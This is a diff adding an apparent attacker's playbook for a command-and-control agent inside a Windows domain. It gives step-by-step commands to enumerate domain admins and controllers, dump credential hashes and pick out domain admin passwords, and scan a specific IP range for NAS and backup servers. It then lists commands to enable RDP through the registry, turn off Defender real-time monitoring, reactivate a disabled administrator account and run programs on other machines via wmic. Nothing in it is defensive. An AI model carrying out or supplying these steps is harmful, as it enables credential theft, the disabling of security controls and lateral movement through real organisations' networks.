@@ -1,0 +1,40 @@
+SWITCHING TO AGENT:
+RIGHT-CLICK ON THE AGENT AND PRESS INTERACT
+
+1)LIST AVAILABLE ADMINISTRATORS   shell net group "domain admins" /domain
+
+2)DOMAIN NAME                           shell net view /all /domain
+
+3) LIST DC (Domain Controllers)   shell nltest /dclist:"NameDomain"
+
+4)TO GET SERVER LIST
+LOAD  PowerView MODULE
+RIGHT-CLICK ON AGENT  Get Info > Get Servers
+NOW YOU HAVE THE SERVER LIST
+
+5)TO GET LIST OF COMPUTERS
+SINCE  PowerView MODULE IS ALREADY LOADED
+RIGHT-CLICK ON AGENT  Get Info > Get All Computers
+NOW YOU HAVE THE LIST OF COMPUTERS
+
+6)IT IS NECESSARY TO GET THE PASSWORDS OF ALL DOMAIN ADMINS
+RIGHT-CLICK ON AGENT
+PRESS ACCESS > DUMP HASHES
+SWITCHING TO A TAB VIEW > CREDENTIALS
+YOU SHOULD TAKE ALL HASHES AND LOOK FOR DOMAIN ADMINS
+
+7)YOU HAVE TO FIND NAS ,BACKUP
+WITH THIS COMMAND WE WILL GET ALL SUBNETS OF THIS DOMAIN  powershell Get-NetSubnet
+WITH THE NEXT COMMAND, YOU WILL SEE THE IP ADRESS WHERE NAS ,BACKUP LOCATED
+portscan 107.191.177.1-107.191.177.255 5000 icmp 1024 
+
+LIST OF USEFUL COMMANDS:
+
+REMOVE THE RIGHTS OF THE AGENT TO DEFAULT  VALUES           rev2self
+ENABLE USER THROUGH CMD                 shell net user Администратор /active:yes
+GET USER INFO                shell net user careadmin /domain
+ENABLE RDP CONNECTION                  shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+TURN OFF DEFENDER                      powershell Set-MpPreference -DisableRealtimeMonitoring $true
+POLICY UPDATE                        shell repadmin /syncall /AdeP
+SHOW DOMAIN TRUST                   shell nltest /domain_trusts /all_trusts
+RUN PROGRAM ON A DIFFERENT PC             shell wmic /node:"NAME OF PC" process call create "COMMAND THAT YOU NEED TO EXECUTE"
